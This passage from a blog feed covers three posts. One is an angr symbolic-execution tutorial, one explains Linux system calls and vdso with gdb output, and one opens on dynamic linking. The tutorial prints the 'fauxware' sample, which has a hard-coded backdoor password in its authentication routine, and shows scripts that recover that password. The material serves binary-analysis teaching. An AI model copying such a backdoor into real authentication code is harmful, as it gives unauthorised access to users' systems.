class="line">0x40058d:       push    rax</div><div class="line">0x40058e:       push    rsp</div><div class="line">0x40058f:       mov     r8, 0x400870</div><div class="line">0x400596:       mov     rcx, 0x4007e0</div><div class="line">0x40059d:       mov     rdi, 0x40071d</div><div class="line">0x4005a4:       call    0x400540</div></pre></td></tr></table></figure></p>
<p>此外，还可将 block 转化为 VEX 中间语言形式。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; block.vex.pp()</div><div class="line">IRSB &#123;</div><div class="line">   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I64 t4:Ity_I64 t5:Ity_I64 t6:Ity_I64</div><div class="line">t7:Ity_I64 t8:Ity_I64 t9:Ity_I64 t10:Ity_I64 t11:Ity_I64 t12:Ity_I64 t13:Ity_I64</div><div class="line"> t14:Ity_I64 t15:Ity_I32 t16:Ity_I64 t17:Ity_I32 t18:Ity_I64 t19:Ity_I64 t20:Ity</div><div class="line">_I64 t21:Ity_I64 t22:Ity_I64 t23:Ity_I64 t24:Ity_I64 t25:Ity_I64 t26:Ity_I64 t27</div><div class="line">:Ity_I64 t28:Ity_I64 t29:Ity_I64 t30:Ity_I64 t31:Ity_I64</div><div class="line"></div><div class="line">   00 | ------ IMark(0x400580, 2, 0) ------</div><div class="line">   01 | PUT(rbp) = 0x0000000000000000</div><div class="line">   02 | ------ IMark(0x400582, 3, 0) ------</div><div class="line">   03 | t21 = GET:I64(rdx)</div><div class="line">   04 | PUT(r9) = t21</div><div class="line">   05 | PUT(pc) = 0x0000000000400585</div><div class="line">   06 | ------ IMark(0x400585, 1, 0) ------</div><div class="line">   07 | t4 = GET:I64(rsp)</div><div class="line">   08 | t3 = LDle:I64(t4)</div><div class="line">   09 | t22 = Add64(t4,0x0000000000000008)</div><div class="line">   10 | PUT(rsi) = t3</div><div class="line">   11 | ------ IMark(0x400586, 3, 0) ------</div><div class="line">   12 | PUT(rdx) = t22</div><div class="line">   13 | ------ IMark(0x400589, 4, 0) ------</div><div class="line">   14 | t5 = And64(t22,0xfffffffffffffff0)</div><div class="line">   15 | PUT(cc_op) = 0x0000000000000014</div><div class="line">   16 | PUT(cc_dep1) = t5</div><div class="line">   17 | PUT(cc_dep2) = 0x0000000000000000</div><div class="line">   18 | PUT(pc) = 0x000000000040058d</div></pre></td></tr></table></figure></p>
<h3 id="2）State"><a href="#2）State" class="headerlink" title="2）State"></a>2）State</h3><p>Project 中保存的是程序的初始内存映像，二进制程序执行后的状态由 SimState（simulated program state）表示。SimState 包含程序执行时的状态数据，比如进程内存、寄存器和文件数据等。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; state = proj.factory.entry_state()</div><div class="line">&gt;&gt;&gt; state.regs.rip    <span class="comment"># 获取寄存器的值</span></div><div class="line">&lt;BV64 0x400580&gt;</div><div class="line">&gt;&gt;&gt; state.regs.rax</div><div class="line">&lt;BV64 0x1c&gt;</div><div class="line"></div><div class="line">&gt;&gt;&gt; state.mem[proj.entry].int.resolved   <span class="comment"># 获取程序入口地址处内存，并解析为int类型</span></div><div class="line">&lt;BV32 0x8949ed31&gt;</div></pre></td></tr></table></figure></p>
<h3 id="3）Simulation-Managers"><a href="#3）Simulation-Managers" class="headerlink" title="3）Simulation Managers"></a>3）Simulation Managers</h3><p>模拟管理器是 angr 中用于执行和模拟程序的接口，可以管理多个程序状态。stash 为包含多个同类状态的列表，默认执行的 stash 为active。模拟管理器中使用 .step() 以基本 block 为单位运行。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)</div><div class="line">&gt;&gt;&gt; simgr.active</div><div class="line">[&lt;SimState @ 0x400580&gt;]</div><div class="line"></div><div class="line">&gt;&gt;&gt; simgr.step()</div><div class="line">&lt;SimulationManager with 1 active&gt;</div><div class="line"></div><div class="line">&gt;&gt;&gt; state.regs.rip    <span class="comment"># 原始的state未改变</span></div><div class="line">&lt;BV64 0x400580&gt;</div><div class="line">&gt;&gt;&gt; simgr.active[0].regs.rip    <span class="comment"># 当前state active[0]已改变</span></div><div class="line">&lt;BV64 0x400540&gt;</div></pre></td></tr></table></figure></p>
<p>执行之后，active 中的状态已更新，而初始状态 state 未改变。SimState 对象在程序执行时是不变的，所以可以将单个状态用作多次执行的“基础”。</p>
<h3 id="4）Analyses"><a href="#4）Analyses" class="headerlink" title="4）Analyses"></a>4）Analyses</h3><p>angr 中内置了多种分析功能（analyses）可用于提取程序中的信息，具体有以下 analyses：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">proj.analyses.BackwardSlice          proj.analyses.DFG                   </div><div class="line">proj.analyses.BinaryOptimizer         proj.analyses.Disassembly           </div><div class="line">proj.analyses.B<span class="keyword">in</span>Diff                proj.analyses.GirlScout             </div><div class="line">proj.analyses.BoyScout              proj.analyses.Identifier            </div><div class="line">proj.analyses.CalleeCleanupFinder     proj.analyses.LoopFinder            </div><div class="line">proj.analyses.CDG                  proj.analyses.Reassembler          </div><div class="line">proj.analyses.CFG                  proj.analyses.reload_analyses       </div><div class="line">proj.analyses.CFGAccurate           proj.analyses.StaticHooker          </div><div class="line">proj.analyses.CFGFast               proj.analyses.VariableRecovery      </div><div class="line">proj.analyses.CongruencyCheck       proj.analyses.VariableRecoveryFast  </div><div class="line">proj.analyses.DDG                  proj.analyses.Veritesting</div></pre></td></tr></table></figure></p>
<p>例如使用 proj.analyses.CFGFast 可以生成程序的控制流图。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; proj = angr.Project(<span class="string">'fauxware'</span>,auto_load_libs=False)   <span class="comment"># 不加载共享库</span></div><div class="line"></div><div class="line">&gt;&gt;&gt; cfg = proj.analyses.CFGFast()</div><div class="line">&gt;&gt;&gt; cfg.graph</div><div class="line">&lt;networkx.classes.digraph.DiGraph object at 0x7f32d5857110&gt;</div><div class="line">&gt;&gt;&gt; len(cfg.graph.nodes())     <span class="comment"># 节点数</span></div><div class="line">92</div></pre></td></tr></table></figure></p>
<h1 id="0x03-分析实例"><a href="#0x03-分析实例" class="headerlink" title="0x03 分析实例"></a>0x03 分析实例</h1><p>state.step() 可运行程序，并返回一个 Simsuccessors 对象。符号执行过程中会产生多个后续状态，所以该对象是包含多个状态的列表。</p>
<p>符号执行过程中遇到类似于 if (x &gt; 4) 的分支时，若 x 为符号位向量，angr 会生成一个约束条件 <bool x_32_1=""> 4&gt;。接着执行两个分支，会产生两个后续状态。第一个状态中添加 x &gt; 4 的约束条件，第二个状态中添加 x &lt;  4 的条件。</bool></p>
<p>以程序 <a href="https://github.com/angr/angr-doc/tree/master/examples/fauxware" target="_blank" rel="external">fauxware</a> 为例，程序中的 authenticate( ) 函数中存在后门。以“SOSNEAKY”为密码，任何用户名都可以通过验证。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">char *sneaky = <span class="string">"SOSNEAKY"</span>;</div><div class="line"></div><div class="line">int authenticate(char *username, char *password)</div><div class="line">&#123;</div><div class="line">	char stored_pw[9];</div><div class="line">	stored_pw[8] = 0;</div><div class="line">	int pwfile;</div><div class="line"></div><div class="line">	// evil back d00r</div><div class="line">	<span class="keyword">if</span> (strcmp(password, sneaky) == 0) <span class="built_in">return</span> 1;</div><div class="line"></div><div class="line">	pwfile = open(username, O_RDONLY);</div><div class="line">	<span class="built_in">read</span>(pwfile, stored_pw, 8);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (strcmp(password, stored_pw) == 0) <span class="built_in">return</span> 1;</div><div class="line">	<span class="built_in">return</span> 0;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>当程序运行到 if (strcmp(password, sneaky) == 0) 分支时会产生两个状态，其中一个状态将会包含用户输入正确后门密码的约束条件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; proj = angr.Project(<span class="string">'fauxware'</span>)</div><div class="line">&gt;&gt;&gt; state = proj.factory.entry_state()</div><div class="line">&gt;&gt;&gt; <span class="keyword">while</span> True:</div><div class="line">...     succ = state.step()</div><div class="line">...     <span class="keyword">if</span> len(succ.successors) == 2:</div><div class="line">...         <span class="built_in">break</span></div><div class="line">...     state = succ.successors[0]</div><div class="line"></div><div class="line">&gt;&gt;&gt; state1,state2 = succ.successors</div><div class="line">&gt;&gt;&gt; state1</div><div class="line">&lt;SimState @ 0x400692&gt;</div><div class="line">&gt;&gt;&gt; state2</div><div class="line">&lt;SimState @ 0x400699&gt;</div></pre></td></tr></table></figure></p>
<p>模拟执行的目标程序从标准输入中获取数据，默认情况下，angr 会将其视为符号数据流。为了进行符号求解并获得满足条件的输入，需要获取从 stdin 输入数据的引用，可以使用 state.posix.files[0].all_bytes() 获取从 stdin 中读取的数据。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; input_data = state1.posix.files[0].all_bytes()</div><div class="line"></div><div class="line">&gt;&gt;&gt; state1.solver.eval(input_data,cast_to=str)</div><div class="line"><span class="string">'\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00'</span></div><div class="line"></div><div class="line">&gt;&gt;&gt; state2.solver.eval(input_data,cast_to=str)</div><div class="line"><span class="string">'\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x00\x80N\x00\x00 \x00\x00</span></div></pre></td></tr></table></figure></p>
<p>由求解结果可知，输入后门密码“SOSNEAKY”可进入 state1，即成功通过身份认证。</p>
<p>还可以使用以下脚本求解：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># !/usr/bin/env python</span></div><div class="line"><span class="keyword">import</span> angr</div><div class="line"></div><div class="line">proj = angr.Project(<span class="string">'fauxware'</span>)</div><div class="line">simgr = proj.factory.simulation_manager()</div><div class="line"></div><div class="line">simgr.explore(find=<span class="keyword">lambda</span> s:<span class="string">'Welcome'</span><span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))</div><div class="line">state = simgr.found[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="keyword">print</span> state.posix.dumps(<span class="number">0</span>)</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="https://www.gitbook.com/book/angr/angr" target="_blank" rel="external">angr Documentation</a>   </p>
]]></content>
      
        <categories>
            
            <category> Program Analysis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> angr </tag>
            
            <tag> binary analysis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux 系统调用与虚拟动态共享库]]></title>
      <url>/2018/0517/linux-system-calls-and-virtual-dynamic-shared-libraries/</url>
      <content type="html"><![CDATA[<p>系统调用是应用程序与操作系统间的接口。Linux 下使用 0x80 号中断作为系统调用入口，使用 eax寄存器指定系统调用号，ebx、ecx、edx、esi、edi 和 ebp 用于传递调用参数；Windows 下使用0x2E 号中断作为系统调用入口。</p>
<p> 直接使用系统调用编程有以下弊端：1）系统调用接口过于原始，使用不方便；2）各操作系统间系统调用不兼容。因此，运行库作为操作系统与应用程序间的抽象层可实现源码级的可移植性。</p>
<h1 id="0x01-Linux-经典系统调用"><a href="#0x01-Linux-经典系统调用" class="headerlink" title="0x01 Linux 经典系统调用"></a>0x01 Linux 经典系统调用</h1><p>现代操作系统中有用户模式和内核模式两种特权模式。操作系统通过中断从用户态切换到内核态。不同中断具有不同的中断号，一个中断号对应一个中断处理程序。内核中使用中断向量表存放中断处理程序的指针。</p>
<p>操作系统使用一个中断号对应所有的系统调用，如 Linux 下的 0x80 为中断处理程序 system_call 的中断号。不同系统调用函数通过 eax 寄存器传递系统调用号指定。Linux经典系统调用实现如下：</p>
<p>1） 触发中断<br>使用 int 0x80 触发系统调用中断。</p>
<p>2） 切换堆栈    </p>
<ul>
<li>从用户态切换到内核态时程序的当前栈也要从用户栈切换到内核栈。具体过程为：</li>
<li>将用户态的寄存器 SS、ESP、EFLAGS、CS 和 EIP 压入内核栈；</li>
<li>将 SS、ESP 设置为内核栈的相应值。<br>当从内核态回到用户态时则进行相反的操作。</li>
</ul>
<p>3） 中断处理程序<br>int 0x80 切换了栈之后进入中断处理程序 system_call 进行系统调用。</p>
<h1 id="0x02-Linux-快速系统调用机制"><a href="#0x02-Linux-快速系统调用机制" class="headerlink" title="0x02 Linux 快速系统调用机制"></a>0x02 Linux 快速系统调用机制</h1><p>vsyscall 和 vdso 是用于在 Linux 中加速某些系统调用的两种机制。vsyscall 是早期的加速方式，它将部分内核代码放在vsyscall 区域。使得用户态程序可以直接调用简单的系统调用，比如 gettimeofday() 。该方式的问题是 vsyscall 的地址在内存空间中是固定的，并不能被地址随机化。vdso 与 vsyscall 的功能相同，其区别在于 vdso 地址可以被 ASLR 随机化。</p>
<p>vdso 是将部分内核调用映射到用户态的地址空间中，使得调用开销更小。由于使用 sysenter/sysexit 没有特权级别检查的处理，也就没有压栈操作，所以执行速度比 int n/iret 快了不少。</p>
<p>Linux 2.5 之后的版本通过虚拟共享库（Virtual Dynamic Shared Object，vdso）支持 sysenter/sysexit。vsdo 不存在实际的文件，只存在于进程虚拟地址空间中。新版本的 vdso 为 linux-vdso.so.1，而在旧版本系统中为 linux-gate.so.1。 该虚拟库为用户程序以处理器可支持的最快的方式调用系统函数提供了必要的逻辑。vsdo 中导出了一系列函数，其中 <code>__kernel_vsyscall</code> 函数负责系统调用。该函数通过 sysenter 进行系统调用。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">➜  syscall ldd getuid_x64</div><div class="line">        linux-vdso.so.1 =&gt;  (0x00007fff851e9000)</div><div class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fde9626d000)</div><div class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007fde96637000)</div><div class="line">➜  syscall ldd getuid_x86_d</div><div class="line">        linux-gate.so.1 =&gt;  (0xf7fae000)</div><div class="line">        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7ddb000)</div><div class="line">        /lib/ld-linux.so.2 (0xf7fb0000)</div></pre></td></tr></table></figure></p>
<p>系统调用多被封装成库函数提供给应用程序调用，应用程序调用库函数后，由 glibc 库负责进入内核调用系统调用函数。在 2.4 内核加上旧版的 glibc 的情况下，库函数通过 int 指令来完成系统调用，而内核提供的系统调用接口很简单，只要在 IDT 中提供 int0x80 的入口，库就可以完成中断调用。</p>
<p>在 2.6 内核中，内核代码同时包含了对 int 0x80 中断方式和 sysenter 指令方式调用的支持，因此内核会给用户空间提供一段入口代码，内核启动时根据 CPU 类型，决定这段代码采取哪种系统调用方式。对于 glibc 来说，无需考虑系统调用方式，直接调用这段入口代码，即可完成系统调用。</p>
<p>系统调用会有两种方式，在静态链接（gcc -static）时，采用 <code>call *_dl_sysinfo</code>指令；在动态链接时，采用 <code>call *gs:0x10</code>指令。用以下示例程序说明这两种情况；<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    getuid();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="1-静态链接"><a href="#1-静态链接" class="headerlink" title="1. 静态链接"></a>1. 静态链接</h2><p>首先编译生成静态链接可执行文件，接着使用 gdb 加载，并反编译 main 函数。main 函数中调用 getuid。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">➜  syscall gcc -static -m32 getuid.c -o getuid_x86_s</div><div class="line">➜  syscall gdb getuid_x86_s -q</div><div class="line">Reading symbols from getuid_x86_s...(no debugging symbols found)...done.</div><div class="line"></div><div class="line">gdb-peda$ disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</div><div class="line">   0x0804887c &lt;+0&gt;:     lea    ecx,[esp+0x4]</div><div class="line">   0x08048880 &lt;+4&gt;:     and    esp,0xfffffff0</div><div class="line">   0x08048883 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]</div><div class="line">   0x08048886 &lt;+10&gt;:    push   ebp</div><div class="line">   0x08048887 &lt;+11&gt;:    mov    ebp,esp</div><div class="line">   0x08048889 &lt;+13&gt;:    push   ecx</div><div class="line">   0x0804888a &lt;+14&gt;:    sub    esp,0x4</div><div class="line">   0x0804888d &lt;+17&gt;:    call   0x806c730 &lt;getuid&gt;</div><div class="line">   0x08048892 &lt;+22&gt;:    mov    eax,0x0</div><div class="line">   0x08048897 &lt;+27&gt;:    add    esp,0x4</div><div class="line">   0x0804889a &lt;+30&gt;:    pop    ecx</div><div class="line">   0x0804889b &lt;+31&gt;:    pop    ebp</div><div class="line">   0x0804889c &lt;+32&gt;:    lea    esp,[ecx-0x4]</div><div class="line">   0x0804889f &lt;+35&gt;:    ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>反编译 getuid 函数，可看到它通过 eax 传入中断号 0xC7，并调用 <code>ds:0x80ea9f0</code>。<code>ds:0x80ea9f0</code> 内存处的值指向 <code>_dl_sysinfo</code> 函数，并不是内核映射页面的代码。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ disassemble 0x806c730</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> getuid:</div><div class="line">   0x0806c730 &lt;+0&gt;:     mov    eax,0xc7</div><div class="line">   0x0806c735 &lt;+5&gt;:     call   DWORD PTR ds:0x80ea9f0</div><div class="line">   0x0806c73b &lt;+11&gt;:    ret    </div><div class="line">End of assembler dump.</div><div class="line"></div><div class="line">gdb-peda$ telescope 0x80ea9f0</div><div class="line">Warning: not running or target is remote</div><div class="line">0000| 0x80ea9f0 --&gt; 0x806f0c0 (&lt;_dl_sysinfo_int80&gt;:     int    0x80)</div><div class="line">0004| 0x80ea9f4 --&gt; 0x8099bd0 (&lt;_dl_make_stack_executable&gt;:     push   esi)</div><div class="line">0008| 0x80ea9f8 --&gt; 0x7</div><div class="line">0012| 0x80ea9<span class="built_in">fc</span> --&gt; 0x37f</div><div class="line"></div><div class="line">gdb-peda$ disassemble 0x806f0c0</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> _dl_sysinfo_int80:</div><div class="line">   0x0806f0c0 &lt;+0&gt;:     int    0x80</div><div class="line">   0x0806f0c2 &lt;+2&gt;:     ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<p>运行程序，再次查看 <code>ds:0x80ea9f0</code> 的值，此时为内核函数<code>__kernel_vsyscall</code> 函数的地址，该函数中通过 sysenter 进行系统调用。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ telescope 0x80ea9f0</div><div class="line">0000| 0x80ea9f0 --&gt; 0xf7ffcdc0 (&lt;__kernel_vsyscall&gt;:    push   ecx)</div><div class="line">0004| 0x80ea9f4 --&gt; 0x8099bd0 (&lt;_dl_make_stack_executable&gt;:     push   esi)</div><div class="line">0008| 0x80ea9f8 --&gt; 0x6</div><div class="line">0012| 0x80ea9<span class="built_in">fc</span> --&gt; 0x37f</div><div class="line">0016| 0x80eaa00 --&gt; 0x3</div><div class="line"></div><div class="line">gdb-peda$ disassemble 0xf7ffcdc0</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> __kernel_vsyscall:</div><div class="line">   0xf7ffcdc0 &lt;+0&gt;:     push   ecx</div><div class="line">   0xf7ffcdc1 &lt;+1&gt;:     push   edx</div><div class="line">   0xf7ffcdc2 &lt;+2&gt;:     push   ebp</div><div class="line">   0xf7ffcdc3 &lt;+3&gt;:     mov    ebp,esp</div><div class="line">   0xf7ffcdc5 &lt;+5&gt;:     sysenter</div><div class="line">   0xf7ffcdc7 &lt;+7&gt;:     int    0x80</div><div class="line">   0xf7ffcdc9 &lt;+9&gt;:     pop    ebp</div><div class="line">   0xf7ffcdca &lt;+10&gt;:    pop    edx</div><div class="line">   0xf7ffcdcb &lt;+11&gt;:    pop    ecx</div><div class="line">   0xf7ffcdcc &lt;+12&gt;:    ret</div></pre></td></tr></table></figure></p>
<p>查看该进程的虚拟内存空间，可看到 <code>__kernel_vsyscall</code> 函数在 vdso 区域。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">➜  syscall cat /proc/36067/maps</div><div class="line">08048000-080e9000 r-xp 00000000 08:01 796245                             /home/lc/Load/syscall/getuid_x86_s</div><div class="line">080e9000-080eb000 rw-p 000a0000 08:01 796245                             /home/lc/Load/syscall/getuid_x86_s</div><div class="line">080eb000-0810e000 rw-p 00000000 00:00 0                                  [heap]</div><div class="line">f7ff9000<span class="_">-f</span>7ffc000 r--p 00000000 00:00 0                                  [vvar]</div><div class="line">f7ffc000<span class="_">-f</span>7ffe000 r-xp 00000000 00:00 0                                  [vdso]</div><div class="line">fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]</div></pre></td></tr></table></figure></p>
<h2 id="2-动态链接"><a href="#2-动态链接" class="headerlink" title="2. 动态链接"></a>2. 动态链接</h2><p>使用以下命令编译动态链接可执行文件，并使用 gdb 加载程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  syscall gcc -m32 getuid.c -o getuid_x86_d</div><div class="line">➜  syscall gdb getuid_x86_d</div></pre></td></tr></table></figure></p>
<p>运行程序后查看 main 函数和 getuid 函数的指令如下，getuid 函数中使用 eax 传入系统调用号，并通过 <code>gs: 010</code> 进行系统调用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ disassemble main</div><div class="line">Dump of assembler code for function main:</div><div class="line">   0x0804840b &lt;+0&gt;:     lea    ecx,[esp+0x4]</div><div class="line">   0x0804840f &lt;+4&gt;:     and    esp,0xfffffff0</div><div class="line">   0x08048412 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]</div><div class="line">   0x08048415 &lt;+10&gt;:    push   ebp</div><div class="line">   0x08048416 &lt;+11&gt;:    mov    ebp,esp</div><div class="line">   0x08048418 &lt;+13&gt;:    push   ecx</div><div class="line">=&gt; 0x08048419 &lt;+14&gt;:    sub    esp,0x4</div><div class="line">   0x0804841c &lt;+17&gt;:    call   0x80482e0 &lt;getuid@plt&gt;</div><div class="line">   0x08048421 &lt;+22&gt;:    mov    eax,0x0</div><div class="line">   0x08048426 &lt;+27&gt;:    add    esp,0x4</div><div class="line">   0x08048429 &lt;+30&gt;:    pop    ecx</div><div class="line">   0x0804842a &lt;+31&gt;:    pop    ebp</div><div class="line">   0x0804842b &lt;+32&gt;:    lea    esp,[ecx-0x4]</div><div class="line">   0x0804842e &lt;+35&gt;:    ret    </div><div class="line">End of assembler dump.</div><div class="line"></div><div class="line">gdb-peda$ disassemble getuid</div><div class="line">Dump of assembler code for function getuid:</div><div class="line">   0xf7eb5270 &lt;+0&gt;:     mov    eax,0xc7</div><div class="line">   0xf7eb5275 &lt;+5&gt;:     call   DWORD PTR gs:0x10</div><div class="line">   0xf7eb527c &lt;+12&gt;:    ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="https://www.ibm.com/developerworks/cn/linux/kernel/l-k26ncpu/index.html" target="_blank" rel="external">Linux 2.6 对新型 CPU 快速系统调用的支持</a><br>[2] 《程序员的自我修养》<br>[3] <a href="http://www.pagefault.info/?p=99" target="_blank" rel="external">linux下系统调用的实现</a></p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 系统调用 </tag>
            
            <tag> vsdo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux 动态链接]]></title>
      <url>/2018/0508/linux-dynamic-link/</url>
      <content type="html"><![CDATA[<p>动态链接在程序运行时才对组成程序的目标文件进行链接，使用动态链接的方式可使得多个进程共用物理内存中的同一个共享目标文件，从而可节省内存空间。此外，使用动态链接使得各个模块更独立，并方便模块的更新。</p>
<p>为了验证多个进程是否可以共用物理内存中同一个共享对象文件中的代码段，需要将进程虚拟地址转换为对应的物理地址。</p>
<h1 id="0x01-内存地址转换"><a href="#0x01-内存地址转换" class="headerlink" title="0x01 内存地址转换"></a>0x01 内存地址转换</h1><p>Linux内核采用页式存储管理，进程的虚拟地址空间被划分成固定大小的页面（ Virtual Page, VP ），物理内存同样被分为与页面大小相同的物理页（Physical Page, PP）。页表是记录虚拟页与物理页映射关系的数据结构。CPU在获得虚拟地址之后，需要通过内存管理单元（Memory Management Unit，MMU）借助页表将虚拟地址映射为物理地址。</p>
<p>将虚拟地址转换为物理地址需要访问页表，然而只有内核态的程序才能访问到页表，用户态程序无权访问。此外，Linux 系统提供了一种用户态程序访问页表的方式，通过查看 <code>/proc/pid/pagemap</code> 文件可得到虚拟内存页映射与物理内存页的映射关系。显然后者更为简单，所以下面使用该方法实现地址转换。</p>
<p>Linux 系统上的 /proc/ 目录是一种虚拟文件系统，存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看系统硬件及系统正在运行进程的信息，或者通过修改这些文件来改变内核的运行状态。</p>
